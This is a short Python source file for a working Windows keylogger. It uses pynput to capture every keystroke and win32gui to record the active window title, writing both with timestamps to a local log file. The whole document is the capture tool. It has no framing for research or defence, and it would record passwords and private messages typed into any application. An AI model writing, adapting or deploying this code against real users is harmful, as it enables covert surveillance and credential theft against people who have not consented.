import logging
from pynput import keyboard
from datetime import datetime
import win32gui

LOG_PATH = "logs/keylog.txt"

# Setup logging
logging.basicConfig(filename=LOG_PATH, level=logging.DEBUG, format='%(message)s')

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown Window"

class KeyLogger:
    def __init__(self):
        self.last_window = None

    def on_press(self, key):
        window = get_active_window()
        if window != self.last_window:
            self.last_window = window
            logging.info(f"\n[{datetime.now()}] :: {window}")

        try:
            logging.info(f"{key.char}")
        except AttributeError:
            logging.info(f"[{key}]")  # For special keys

    def run(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    kl = KeyLogger()
    kl.run()
